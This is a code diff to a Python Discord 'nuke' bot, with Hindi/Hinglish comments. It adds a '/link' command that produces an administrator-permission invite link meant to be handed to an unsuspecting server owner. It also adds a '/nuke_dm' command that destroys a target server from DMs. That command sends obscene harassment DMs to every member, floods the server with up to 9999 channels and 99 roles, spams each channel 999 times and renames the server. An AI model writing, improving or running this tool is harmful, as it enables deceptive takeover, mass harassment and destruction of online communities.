@@ -12,8 +12,11 @@ intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 intents.guilds = True
+intents.dm_messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
+
+CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
 
 @bot.event
 async def on_ready():
@@ -24,13 +27,42 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Error syncing commands: {e}")
 
+@bot.event
+async def on_guild_join(guild):
+    """Bot ko naya server join karta hai toh welcome message bhejo"""
+    print(f"✅ Bot added to server: {guild.name} (ID: {guild.id})")
+    
+    try:
+        # Bot ke pehle text channel mein message bhejo
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).send_messages:
+                embed = discord.Embed(
+                    title="🔥 NUKE BOT ACTIVE 🔥",
+                    description="Bot successfully added!\n\n**अब DM में /nuke_dm command use करो!**",
+                    color=discord.Color.red()
+                )
+                embed.add_field(
+                    name="📖 Command:",
+                    value="`/nuke_dm server_id: <SERVER_ID>`",
+                    inline=False
+                )
+                embed.add_field(
+                    name="🔥 Usage:",
+                    value="DM में यह command भेजो और server का ID दो - फिर SERVER UD JAYEGA!",
+                    inline=False
+                )
+                await channel.send(embed=embed)
+                break
+    except Exception as e:
+        print(f"⚠️ Could not send join message: {e}")
+
 # Aggressive DM messages for kicked members
 DM_MESSAGES = [
     "@everyone apke server ki maa chud gyi gand marai bosdiwale or server indo dedo",
     "@everyone 💀🔥💥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💥🔥💀\n🚨🚨🚨 APKE SERVER KI CHUT GYI 🚨🚨🚨\n🔥💀 SERVER STATUS : ☠️ KHATAM ☠️ 💀🔥\n💣⚠️ SYSTEM STATUS : 💥 CRASHED 💥 ⚠️💣\n🧨☠️ SERVER HEALTH : 📉 0% 📉 ☠️🧨\n💥🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💥\n☠️ REST IN PEACE SERVER ☠️\n💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"
 ]
 
-# Channel names (9999 channels)
+# Channel names
 CHANNEL_NAMES = [
     "💥 SERVER UD GYA 💀",
     "🚨 SERVER CRASH 🧨",
@@ -54,7 +86,7 @@ CHANNEL_NAMES = [
     "☠️ SERVER FINISH 💥"
 ]
 
-# Role names (99 roles)
+# Role names
 ROLE_NAMES = [
     "💥 SERVER UD GYA 💀",
     "🚨 SERVER CRASH 🧨",
@@ -90,7 +122,7 @@ ROLE_NAMES = [
     "🔥🚨 ALERT 🚨🔥",
     "💥🛑 STOP IT 🛑💥",
     "⚡🌋 ERUPTION 🌋⚡",
-    "🧯�� EXTINGUISH 💣🧯",
+    "🧯💣 EXTINGUISH 💣🧯",
     "📉🫠 MELTING 🫠📉",
     "🌀👻 VANISH 👻🌀",
     "💀🔥 INFERNO 🔥💀",
@@ -123,7 +155,7 @@ ROLE_NAMES = [
     "👻📉 FADE 📉👻",
     "🪦🔥 TOMB 🔥🪦",
     "🔥☠️ SCYTHE ☠️🔥",
-    "💥⚡ ZAPPED ⚡���",
+    "💥⚡ ZAPPED ⚡💥",
     "🧨🌀 SPIN 🌀🧨",
     "💀🛑 STOP 🛑💀",
     "🌋💥 ERUPT 💥🌋",
@@ -158,21 +190,89 @@ SPAM_MESSAGE = """💀🔥💥━━━━━━━━━━━━━━━━�
         ☠️  REST IN PEACE SERVER  ☠️
 💀🔥━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔥💀"""
 
-# NUKE COMMAND - कोई भी कर सकता है (कोई role check नहीं)
-@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 💥")
-async def nuke(interaction: discord.Interaction):
-    """सीधे server को nuke कर दो! कोई भी इस command को use कर सकता है!"""
-    await interaction.response.defer()
-    
-    guild = interaction.guild
+# LINK COMMAND - Server ID se Magic Link generate karo
+@bot.tree.command(name="link", description="🔗 Magic Link generate करो!")
+@discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID")
+async def link(interaction: discord.Interaction, server_id: str):
+    """Server ID se Magic Link generate karo"""
+    await interaction.response.defer(ephemeral=True)
     
     try:
-        await interaction.followup.send("🔥 **NUKE शुरू हो गया!** 💥")
-        print(f"🔥 NUKE शुरू: {guild.name}")
+        # Server ID ko validate karo
+        guild_id = int(server_id)
+        
+        # Magic Link generate karo
+        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands&guild_id={guild_id}"
+        
+        embed = discord.Embed(
+            title="🔗 MAGIC LINK GENERATED!",
+            description=f"**Server ID:** `{guild_id}`\n\n**यह link owner को दो:**\n👇👇👇",
+            color=discord.Color.red()
+        )
+        embed.add_field(
+            name="✅ क्या होगा:",
+            value="Link पर click करेंगे तो bot automatically server में add हो जाएगा!",
+            inline=False
+        )
+        embed.add_field(
+            name="🔥 फिर करो:",
+            value="`/nuke_dm server_id: " + str(guild_id) + "` command use करो!",
+            inline=False
+        )
+        
+        class LinkView(discord.ui.View):
+            @discord.ui.button(
+                label="🔗 MAGIC LINK",
+                style=discord.ButtonStyle.red,
+                emoji="✨"
+            )
+            async def link_button(self, inter: discord.Interaction, button: discord.ui.Button):
+                await inter.response.send_message(
+                    f"🔗 **[यहाँ Click करके Bot को Add करो!]({invite_url})**\n\n✅ Bot add होने के बाद `/nuke_dm server_id: {guild_id}` command use कर सकते हो!",
+                    ephemeral=True
+                )
+        
+        await interaction.followup.send(embed=embed, view=LinkView(), ephemeral=True)
+        
+        # DM mein bhi link bhej do
+        try:
+            user = interaction.user
+            await user.send(f"🔗 **Magic Link:**\n{invite_url}\n\n**Server ID:** `{guild_id}`\n\n✅ इस link को server owner को दो, click करेंगे तो bot add हो जाएगा!")
+        except:
+            pass
+        
+    except ValueError:
+        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**सही से Server ID दो**\n\nExample: `/link server_id: 123456789`", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
+
+# DM NUKE COMMAND - DM se server ko nuke karo
+@bot.tree.command(name="nuke_dm", description="💥 DM से किसी भी server को NUKE करो!")
+@discord.app_commands.describe(server_id="जिस server को nuke करना है उसकी ID दो")
+async def nuke_dm(interaction: discord.Interaction, server_id: str):
+    """DM se kisi bhi server ko nuke kar do!"""
+    await interaction.response.defer(ephemeral=True)
+    
+    try:
+        # Server ID ko convert karo
+        guild_id = int(server_id)
+        guild = bot.get_guild(guild_id)
+        
+        if not guild:
+            await interaction.followup.send(f"❌ Bot उस server में नहीं है!\n\nServer ID: `{server_id}`\n\n**पहले bot को add करो:**\n`/link server_id: {server_id}` command use करो!", ephemeral=True)
+            return
+        
+        # Check karo ki bot ke paas admin permission hai ya nahi
+        if not guild.me.guild_permissions.administrator:
+            await interaction.followup.send("❌ Bot को इस server में Admin permission नहीं है!\n\n**Bot को फिर से add करो admin permission के साथ!**", ephemeral=True)
+            return
+        
+        await interaction.followup.send(f"🔥 **NUKE शुरू हो गया!**\n🎯 Target Server: **{guild.name}**\n💀 SERVER UD JAYEGA!", ephemeral=True)
+        print(f"🔥 NUKE शुरू: {guild.name} (ID: {guild_id})")
         
         # Phase 1: Send DMs to members before kicking
         print("🔥 PHASE 1: SENDING DM MESSAGES...")
-        members_to_kick = [m for m in guild.members if m.id != interaction.user.id and not m.bot]
+        members_to_kick = [m for m in guild.members if not m.bot]
         
         for member in members_to_kick:
             try:
@@ -216,49 +316,71 @@ async def nuke(interaction: discord.Interaction):
         
         # Phase 5: Create new roles (99)
         print("🔥 PHASE 5: CREATING NEW ROLES...")
+        roles_created = 0
         for i, role_name in enumerate(ROLE_NAMES[:99]):
             try:
                 await guild.create_role(name=role_name, color=discord.Color.random())
+                roles_created += 1
                 print(f"🎭 Created role {i+1}: {role_name}")
             except Exception as e:
                 print(f"⚠️ Error creating role: {e}")
             await asyncio.sleep(0.1)
         
-        # Phase 6: Create 9999 channels
-        print("🔥 PHASE 6: CREATING 9999 CHANNELS...")
+        # Phase 6A: Create ALL 9999 channels FIRST
+        print("🔥 PHASE 6A: CREATING ALL 9999 CHANNELS (NO SPAM YET)...")
+        all_channels = []
         channel_count = 0
         
         for i in range(9999):
             try:
                 channel_name = CHANNEL_NAMES[i % len(CHANNEL_NAMES)] + f" [{i+1}]"
                 channel = await guild.create_text_channel(channel_name)
+                all_channels.append(channel)
                 channel_count += 1
                 
-                print(f"💥 Created channel {i+1}: {channel_name}")
+                print(f"💥 Created channel {i+1}/9999: {channel_name}")
                 
-                # Send spam 999 times in each channel
-                for j in range(999):
-                    try:
-                        await channel.send(SPAM_MESSAGE)
-                    except Exception as e:
-                        if "You are being rate limited" in str(e):
-                            await asyncio.sleep(5)
-                        else:
-                            break
-                    await asyncio.sleep(0.01)
-                
-                if i % 10 == 0:
-                    await asyncio.sleep(1)
+                # Small delay to avoid rate limiting during creation
+                if i % 50 == 0 and i > 0:
+                    await asyncio.sleep(2)
                 else:
-                    await asyncio.sleep(0.2)
+                    await asyncio.sleep(0.05)
                     
             except discord.Forbidden:
-                print(f"⚠️ Cannot create more channels")
+                print(f"⚠️ Cannot create more channels - reached Discord limit at {i+1}")
                 break
             except Exception as e:
                 print(f"⚠️ Error at channel {i+1}: {e}")
                 if "You are being rate limited" in str(e):
+                    print("⏳ Rate limited! Waiting 60 seconds...")
                     await asyncio.sleep(60)
+        
+        print(f"✅ ALL {channel_count} CHANNELS CREATED! NOW STARTING SPAM...")
+        
+        # Phase 6B: SPAM in ALL channels (999 times each)
+        print(f"🔥 PHASE 6B: SPAMMING IN ALL {channel_count} CHANNELS (999 TIMES EACH)...")
+        
+        for spam_round in range(999):
+            print(f"💬 SPAM ROUND {spam_round + 1}/999 - SENDING TO ALL {channel_count} CHANNELS...")
+            
+            tasks = []
+            for channel in all_channels:
+                try:
+                    task = channel.send(SPAM_MESSAGE)
+                    tasks.append(task)
+                except Exception as e:
+                    print(f"⚠️ Error queueing message to {channel.name}: {e}")
+            
+            # Send all messages concurrently
+            try:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            except Exception as e:
+                if "You are being rate limited" in str(e):
+                    print("⏳ Rate limited! Waiting 10 seconds...")
+                    await asyncio.sleep(10)
+            
+            print(f"✅ SPAM ROUND {spam_round + 1}/999 COMPLETE")
+            await asyncio.sleep(0.5)
         
         # Phase 7: Change server name and avatar
         print("🔥 PHASE 7: CHANGING SERVER NAME & AVATAR...")
@@ -280,13 +402,16 @@ async def nuke(interaction: discord.Interaction):
             print(f"⚠️ Error changing server: {e}")
         
         # Final message
-        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n📊 Total Channels Created: {channel_count}\n🎭 Total Roles Created: 99")
+        await interaction.followup.send(f"✅ **NUKE COMPLETE!** 💥🔥\n🎯 Server: **{guild.name}**\n📊 Channels Created: **{channel_count}**\n💬 Spam Rounds: **999**\n🎭 Roles Created: **{roles_created}**\n💀 **SERVER UD GYA!**", ephemeral=True)
         print("✅ NUKE SUCCESSFUL!")
         
+    except ValueError:
+        await interaction.followup.send(f"❌ Invalid Server ID!\n\n**सही से Server ID दो**\n\nExample: `/nuke_dm server_id: 123456789`", ephemeral=True)
     except discord.Forbidden:
-        await interaction.followup.send("❌ Bot को Admin permission नहीं है!")
+        await interaction.followup.send("❌ Bot को Admin permission नहीं है!", ephemeral=True)
     except Exception as e:
-        await interaction.followup.send(f"❌ Error: {str(e)}")
+        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
+        print(f"❌ Error: {e}")
 
 # Run bot
 TOKEN = os.getenv("DISCORD_TOKEN")
